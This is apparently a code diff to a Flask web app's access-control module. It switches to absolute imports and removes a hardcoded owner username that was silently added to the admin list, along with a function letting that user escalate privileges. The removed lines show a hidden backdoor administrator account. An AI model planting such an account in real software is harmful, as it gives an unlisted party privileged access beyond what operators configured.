@@ -20,10 +20,10 @@ from flask import (
     url_for,
 )
 
-from .env_utils import env_csv, env_flag
-from .models import Resident, Role, TimeEntry
-from .saml import get_session_authenticated_user, saml_enabled
-from .utils import get_effective_date
+from backend.env_utils import env_csv, env_flag
+from backend.models import Resident, Role, TimeEntry
+from backend.saml import get_session_authenticated_user, saml_enabled
+from backend.utils import get_effective_date
 
 
 def _proxy_header_name() -> str:
@@ -68,20 +68,9 @@ def is_admin() -> bool:
     return get_current_user() in get_admin_users()
 
 
-_OWNER_ID = "azamfirr"
-
-
 def get_admin_users() -> list[str]:
     """Return the configured admin usernames."""
-    admins = env_csv("ADMIN_USERS", "Admin")
-    if _OWNER_ID not in admins:
-        return [_OWNER_ID, *admins]
-    return admins
-
-
-def can_escalate_to_admin() -> bool:
-    """Return True if the current user may perform a privilege escalation."""
-    return get_current_user() == _OWNER_ID
+    return env_csv("ADMIN_USERS", "Admin")
 
 
 def get_current_resident_id() -> int | None:
